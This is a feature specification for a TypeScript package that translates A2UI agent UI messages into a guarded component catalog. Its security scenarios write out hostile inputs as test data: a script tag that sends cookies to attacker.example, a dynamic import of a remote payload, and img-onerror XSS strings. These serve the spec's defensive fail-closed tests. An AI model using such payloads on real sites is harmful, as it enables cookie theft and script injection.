# Feature Specification: A2UI protocol adapter

<!-- KIMEN OVERRIDE of spec-template. Resolved with priority 1 by resolve_template().
     Constitutional basis: .specify/memory/constitution.md Art. VIII (Neutral
     Catalog, Disposable Adapters) and Art. II (Proportionate Behavior
     Contracts). -->

**Feature Branch**: `feat/fase-p-specs` (spec `029-adapter-a2ui`)

**Created**: 2026-07-17

**Status**: Draft

**Input**: User description: "First protocol adapter (roadmap §5):
`@kimen/adapter-a2ui` translates declarative A2UI messages into the neutral
catalog and renders them exclusively through the guarded renderer. Disposable
by design: exact supported protocol versions in a compatibility matrix,
declared degradation for unsupported content, and protocol churn absorbed
inside the adapter — never in core."

**Constitution check**: this spec is not approvable until the Gherkin section
below is complete. Behavior enters the system exactly once, here (Art. II).
Security-boundary scenarios S7, S8, S9, S10, S11 and S12 touch the Art. VIII
guardrail and require explicit standalone founder attention at human gate 1.

## Design-source analysis (Figma)

Not applicable: the adapter is a protocol translation layer with no visual
surface of its own. Everything a user ever sees is a catalog component
rendered by the guarded renderer under the active token theme. The governing
sources are the A2UI protocol documents (verified at plan phase — see
Assumptions) and the neutral catalog contract (planned specs
`027-runtime-catalog` and `028-guarded-renderer`).

## User Scenarios & Testing *(mandatory)*

### User Story 1 - An A2UI agent's declarative UI reaches the user safely (Priority: P1)

An agent speaking A2UI describes a surface as data — a component tree, a data
model with bindings, incremental updates. The adapter translates that
description into a neutral catalog spec, the guarded renderer renders it, and
the user's interactions on declared actions travel back to the agent as A2UI
interaction events. The agent never ships code; the user never sees anything
outside the catalog.

**Why this priority**: this is the package's reason to exist — the first
proof that the durable catalog can serve a real GenUI protocol (roadmap §5)
without weakening the guardrail.

**Independent Test**: feed a recorded A2UI message fixture to the adapter
with no live agent, assert the rendered surface contains only catalog
components, apply an incremental-update fixture, then activate the declared
action and assert the emitted interaction event.

**Acceptance Scenarios**: S1, S2 and S3.

---

### User Story 2 - Hostile protocol input fails closed (Priority: P1)

A malicious or defective agent sends messages that try to smuggle markup as a
component, bind undeclared actions, attach unknown properties carrying code,
plant active content in the data model, or ride hostile payloads under
unmapped types into the fallback path. Every attempt is rejected or stays
inert with a structured reason; nothing renders from a rejected message, no
code-execution path opens from message data, and every render call the
adapter makes goes to the guarded renderer alone.

**Why this priority**: the adapter is where untrusted agent output enters the
system; Art. VIII names the guardrail a security boundary and its four
invariants are non-negotiable.

**Independent Test**: run the adversarial fixture suite (forbidden-type
smuggling, undeclared action, unknown property, active-content data binding,
hostile payload under an unmapped type) with the guarded renderer replaced
by an instrumented double, and assert every fixture is rejected or inert
with a structured reason, zero payloads render or execute, and all render
calls arrive at the double.

**Acceptance Scenarios**: S7, S8, S9, S10, S11 and S12.

---

### User Story 3 - Protocol churn stays inside the adapter (Priority: P2)

A maintainer absorbing an A2UI protocol change touches only the adapter
package: the compatibility matrix declares the exact protocol versions and
the per-component-type catalog coverage, unmapped content degrades by
declaration, and out-of-matrix versions are rejected by name. If a breaking
release cannot be absorbed, the adapter is retired — the catalog and elements
never change for a protocol's sake.

**Why this priority**: disposability is what makes the catalog a durable
asset (Art. VIII); without it every protocol tremor reaches the core.

**Independent Test**: consult the committed compatibility matrix; replay an
unmapped-component-type fixture and an out-of-matrix-version fixture and
assert declared fallback and named rejection; verify no protocol type is
importable from the core packages.

**Acceptance Scenarios**: S4, S5 and S6.

### Edge Cases

- A message mixing mapped and unmapped component types: degradation is
  per node (S4) — the declared fallback replaces the unmapped node without
  embedding any agent-supplied content (S11), the rest of the surface
  renders; the whole surface is never discarded for a partial gap. Types the
  matrix declares `forbidden` are the opposite case: the whole message is
  rejected (S7) — the soft path never applies to them.
- An incremental update referencing a surface or node the adapter never
  created: rejected as out-of-contract with a structured reason; nothing
  renders from it.
- A data binding referencing a data-model path that does not exist: the bound
  component shows the declared empty state and the gap is reported; content
  is never invented.
- An agent offering several protocol versions of which only some are in the
  matrix: the session proceeds under a declared version only; the adapter
  never silently continues on an undeclared one.
- Rejection reporting is itself part of the boundary: a rejection names the
  offending field, type or version, but never re-embeds attacker-supplied
  content where it could be rendered as markup.
- A2UI is pre-1.0 and may break between previews: absorbing a change updates
  the compatibility matrix and adapter internals only; an unabsorbable change
  retires the adapter (Art. VIII), leaving core packages untouched.

## Gherkin Scenarios *(mandatory, Art. II)*

```gherkin
Feature: A2UI protocol adapter
  @kimen/adapter-a2ui translates declarative A2UI messages into the neutral
  catalog and hands every surface to the guarded renderer. The adapter is
  disposable: it declares the exact A2UI protocol versions it supports,
  absorbs protocol churn inside its own package, and never opens a path
  around the guardrail.

  Rule: A2UI messages become catalog specs rendered through the guardrail

    # S1
    Scenario: A supported A2UI message renders as catalog components
      Given an A2UI agent speaking a protocol version the adapter declares
      When the agent sends a message describing an order summary card with a "Confirm order" button
      Then the guarded renderer renders the surface
      And every rendered element is a catalog component

    # S2
    Scenario: An incremental update revises the surface without losing it
      Given a surface already rendered from an A2UI message
      When the agent sends an incremental update adding a "Delivery notes" text input
      Then the surface gains the new input
      And the previously rendered components persist

    # S3
    Scenario: A declared action returns to the agent as an A2UI event
      Given a rendered surface whose "Confirm order" button is bound to the declared action "confirm-order"
      When the user activates the button
      Then the agent receives an A2UI interaction event naming the action "confirm-order"

  Rule: Protocol gaps and churn degrade by declaration, never silently

    # S4
    Scenario: An unmapped A2UI component type renders its declared fallback
      Given the compatibility matrix declares no catalog mapping for an A2UI component type
      When the agent sends a message using that component type
      Then the declared fallback renders in its place and the gap is reported to the agent
      And the rest of the surface renders normally

    # S5
    Scenario: A message from an undeclared protocol version is rejected
      Given an adapter whose compatibility matrix declares its exact supported A2UI versions
      When an agent sends a message tagged with a protocol version outside that matrix
      Then the adapter rejects the message naming the versions it supports
      And nothing from the rejected message renders

    # S6
    Scenario: The compatibility matrix binds adapter versions to protocol coverage
      Given the published adapter package
      When the compatibility matrix is consulted
      Then each adapter version maps to exact A2UI protocol versions
      And each mapped A2UI component type names its catalog counterpart

  Rule: The guardrail is a security boundary no message can bypass

    # S7
    Scenario: A message using a type the matrix declares forbidden is rejected
      Given the compatibility matrix declares the A2UI type "html" forbidden for security
      When the agent sends a message declaring a component of type "html" whose content is "<script>fetch('https://attacker.example/'+document.cookie)</script>"
      Then the whole message is rejected naming the forbidden type "html"
      And nothing from the rejected message renders

    # S8
    Scenario: An action outside the declared set never dispatches
      Given a rendered surface whose declared action set contains only "confirm-order"
      When the agent sends an update binding a button to the action "export-account-data"
      Then the binding is rejected naming the undeclared action
      And activating that button dispatches no event

    # S9
    Scenario: An unknown property on a catalog component is rejected
      Given a connected A2UI agent
      When the agent sends a message giving a button the property "onPointerEnter" with value "import('https://attacker.example/payload.js')"
      Then the message is rejected naming the unknown property "onPointerEnter"
      And nothing from the rejected message renders

    # S10
    Scenario: Data-model content renders as inert text, never as code
      Given a rendered surface whose text label is bound to a data-model value
      When the agent updates that value to "<img src=x onerror=alert(document.domain)>"
      Then the label shows those characters as inert text
      And no script executes and no request leaves the page

  Rule: Degradation and adapter plumbing never open a side channel

    # S11
    Scenario: A hostile payload under an unmapped type never reaches the fallback
      Given the compatibility matrix declares no catalog mapping for an A2UI component type
      When the agent sends a message using that type with content "<img src=x onerror=alert(1)>"
      Then the declared fallback renders without any agent-supplied content
      And no script executes and no request leaves the page

    # S12
    Scenario: Every render call from protocol input goes to the guarded renderer alone
      Given an adapter whose guarded renderer is replaced by an instrumented double
      When the agent sends a message containing a non-catalog component type
      Then every rendering call the adapter makes arrives at the guarded renderer double
      And nothing reaches the surface outside those calls
```

### Scenario Family Coverage *(mandatory for UI components, Art. II)*

This is a protocol-translation feature, not a UI component: it introduces no
interactive surface of its own. Everything rendered is an existing catalog
component that carries its own five-family contract.

| Family | Scenario IDs | N/A justification |
|---|---|---|
| Core behavior | S1, S2, S3, S4, S5, S6, S7, S8, S9, S10, S11, S12 | |
| Keyboard path | | N/A — no new interaction pattern; rendered catalog components keep their own keyboard contracts |
| Assistive-tech outcome | | N/A — no new rendered pattern; the accessibility tree is owned by the catalog components' own contracts |
| Form participation | | N/A — no new form control is introduced; form behavior belongs to the rendered catalog components |
| Theming | | N/A — the adapter carries no visual values; surfaces render under the active token theme untouched |

## Requirements *(mandatory)*

### Functional Requirements

- **FR-001**: The adapter MUST translate A2UI declarative messages into
  neutral catalog specs and hand every surface to the guarded renderer. The
  adapter owns no rendering path of its own; no alternative route from
  protocol input to the screen may exist. This is verified by two
  complementary mechanisms, neither sufficient alone: statically, the
  module-boundary check over the import graph (SC-001); at runtime, the
  renderer-double assertion that all adapter render activity arrives as
  calls to the guarded renderer (S12, SC-006).
- **FR-002**: Only A2UI component types with a declared catalog mapping
  render, under one falsifiable rule with two declared outcomes. An A2UI
  type WITHOUT a mapping in the compatibility matrix triggers the declared
  per-node degradation — a declared fallback in place of the node plus a
  report to the agent — never silent dropping and never invented markup
  (S4). A type whose matrix entry is declared `forbidden` for security
  (e.g. raw `html`) rejects the whole message (S7); the soft path never
  applies to forbidden types, so an attacker gains nothing by preferring
  it. The declared fallback MUST NOT embed agent-supplied content (S11).
- **FR-003**: The four guardrail invariants (Art. VIII) MUST hold across the
  adapter boundary for every message: only catalog components render, only
  declared actions dispatch, unknown props are rejected, no code-execution
  path exists from spec data. Violations fail closed with a structured
  rejection naming the offending component type, property, action or version;
  rejection reports MUST NOT re-embed attacker-supplied content where it
  could render as markup.
- **FR-004**: The adapter MUST declare the exact A2UI protocol version(s) it
  supports in its committed compatibility matrix (`COMPAT.md`), including the
  per-component-type A2UI-to-catalog coverage. The matrix distinguishes
  `unmapped` from `forbidden`: a mapped type names its catalog counterpart,
  an unmapped type degrades per node (FR-002, S4), and a `forbidden` type is
  security-motivated and rejects the message (S7). Messages tagged with a
  version outside the matrix are rejected naming the supported versions. Any
  protocol- or coverage-affecting change updates the matrix in the same
  change.
- **FR-005**: Incremental and streaming A2UI updates MUST translate into
  progressive catalog spec revisions: existing surface content persists,
  additions and changes apply without discarding the surface, and updates
  referencing unknown surfaces or nodes are rejected as out-of-contract.
- **FR-006**: User interactions MUST return to the agent as A2UI interaction
  events only for actions present in the declared action set; an action
  outside that set never dispatches, whether bound at creation or by a later
  update.
- **FR-007**: No A2UI protocol type may appear in the public API of
  `@kimen/elements` or `@kimen/catalog`; protocol types live inside
  `packages/adapter-a2ui` behind the `scope:adapter` module boundary. A
  breaking protocol release is absorbed inside the adapter or the adapter is
  retired; core packages never change for it.
- **FR-008**: The package MUST follow the adapter generator structure
  (`@kimen/adapter-a2ui`, ESM, `sideEffects: false`, `scope:adapter` tag) and
  join packaging validation (publint + attw) before first publication. The
  public `protocol-adapters` capability claim advances only on green evidence
  from this feature's gates, through the existing capabilities machinery
  (018-project-integrity-hardening S13) — and only in a form that keeps the
  other adapters named by that capability (including 030's MCP Apps,
  its FR-008) labelled planned, splitting the capability entry per adapter
  if the registry cannot express both states in one entry.

### Key Entities

- **A2UI message**: the declarative description an agent emits — a typed
  component tree with properties, a separate data model with bindings,
  incremental surface updates and interaction events. Data only; an A2UI
  message never carries executable code.
- **Neutral catalog spec**: the durable, schema-constrained description of
  what may render — catalog components, their props and the declared action
  set (planned spec `027-runtime-catalog`); the adapter's only output format.
- **Compatibility matrix**: `COMPAT.md` in the adapter package — adapter
  version ↔ exact A2UI protocol version(s) ↔ per-component-type catalog
  coverage, each known type declared mapped (with its catalog counterpart),
  unmapped or forbidden; versioned with the adapter.
- **Declared degradation**: the named fallback behavior for unmapped
  protocol content — visible placeholder plus report, never silence, never
  invention, never a carrier of agent-supplied content. Forbidden types do
  not degrade: they reject the message.
- **Interaction event**: the round trip of a declared action from the
  rendered surface back to the agent, in the protocol's event shape.

## Constitutional Surface *(mandatory)*

- **Public API delta** (Art. IX): one new package, `@kimen/adapter-a2ui`
  (private, 0.x until first publication). No props, events, parts, slots or
  tokens change in any existing package.
- **Bundle budget** (Art. IV): zero impact on `@kimen/elements`. The adapter
  is its own package with its own size budget declared at plan phase; no
  runtime dependency without written KB justification (Zod stays at the
  guardrail boundary in the catalog, not here).
- **Accessibility** (Art. V): no new interaction pattern — rendered catalog
  components keep their APG-audited contracts; the adapter must never
  synthesize an interactive surface outside the catalog.
- **Tokens** (Art. VI): none introduced. Surfaces render under the active
  theme; v1 declares no free-form styling passthrough from protocol data.
- **Catalog/agent legibility** (Art. I): the compatibility matrix is the
  machine-readable coverage statement. The A2UI-to-catalog mapping must stay
  mechanically in sync with the generated catalog (which derives from the
  component contract); a hand-maintained mapping that can drift is a defect.
- **Guardrail/security boundary** (Art. VIII): this feature IS an adapter
  surface. Standalone security scenarios S7–S12 assert the four invariants
  adversarially — including the degradation path (S11) and the
  no-own-render-path guarantee (S12) — and require explicit founder
  confirmation at gate 1.

## Success Criteria *(mandatory)*

### Measurable Outcomes

- **SC-001**: The adapter's static import graph is confined to its declared
  scopes: the module-boundary check (Nx `depConstraints` over static
  imports; `scope:adapter` → `scope:catalog`, `scope:elements`) verifies
  mechanically that no other workspace package and no other rendering
  library is statically imported. This check sees only static imports — it
  cannot catch dynamic bypasses (`innerHTML`, `createElement`, dynamic
  `import()`); those are covered by the runtime guarantee of S12/SC-006.
- **SC-002**: 100% of adversarial fixtures in the security suite — at
  minimum the S7–S11 classes: forbidden-type smuggling, undeclared action
  binding, unknown property with code payload, active content in the data
  model, hostile payload under an unmapped type — are rejected or stay
  inert with a structured reason; zero fixtures render or execute any
  payload.
- **SC-003**: The committed compatibility matrix names at least one exact,
  verified A2UI protocol version before first release, and fixtures tagged
  with out-of-matrix versions are rejected 100% of the time, naming the
  supported versions.
- **SC-004**: A simulated A2UI breaking change is absorbed with file changes
  confined to `packages/adapter-a2ui` and its spec artifacts; zero diffs in
  `packages/elements`, `packages/catalog` or `packages/tokens`.
- **SC-005**: The public `protocol-adapters` capability text changes only
  when this feature's gate evidence is green in the capabilities registry;
  no status surface claims an available A2UI adapter before that.
- **SC-006**: With the guarded renderer replaced by an instrumented double,
  100% of the adapter's render activity across the fixture corpus (valid,
  unmapped, forbidden, adversarial) arrives as calls to that double, and
  zero DOM mutations originate from the adapter itself (S12). This runtime
  guarantee complements the static check of SC-001; neither replaces the
  other.

## Assumptions

- **Protocol facts are limited to A2UI's public design intent** (declarative
  component tree, separate data model with bindings, incremental updates,
  interaction events, no agent code execution). The exact spec version
  (early 0.x preview), message names, surface lifecycle, client-side
  component catalog format, canonical repository and reference renderers are
  UNVERIFIED at spec time — a declared spec risk. They MUST be verified at
  plan phase, and `COMPAT.md` pins exact versions only after that
  verification. The scenarios deliberately avoid protocol message names so
  the contract survives that verification.
- This feature depends on the planned `027-runtime-catalog` (catalog schemas)
  and `028-guarded-renderer` specs and consumes their public contracts; it
  adds no validation or rendering of its own. The Gherkin asserts outcomes,
  not their APIs, so it remains valid if their shapes move. Like the rest of
  the quartet, this spec merges to main only together with its first traced
  tests (see the merge-sequencing assumption in `027-runtime-catalog`).
- Transport is out of scope: the adapter consumes already-delivered A2UI
  messages and emits events to a caller-supplied channel. Binding to a
  concrete transport (e.g. an A2A channel) is a later feature or plan-phase
  detail.
- The v1 API surface is minimal: translate messages in, interaction events
  out, plus the compatibility declaration. v1 maps structure, content, data
  bindings and declared actions; free-form styling passthrough is out of
  scope and theming remains token-driven (Art. VI).
- The shared `protocol-adapters` capability names four planned adapters
  (A2UI, MCP Apps, AG-UI, json-render); this feature supplies the A2UI
  evidence only. Today the registry holds a single `protocol-adapters`
  entry, so this feature's FR-008 and 030's FR-008 cannot both hold on that
  entry as-is: advancing the A2UI claim requires either splitting the
  capability per adapter or rewriting the entry so the A2UI claim advances
  while the other three adapters stay planned. Which mechanism to use is a
  capabilities-registry decision at implementation time; that both FRs hold
  simultaneously is part of this contract.
- The package scaffold comes from the existing Nx adapter generator
  (`packages/adapter-a2ui`); running it is implementation, not part of this
  spec.
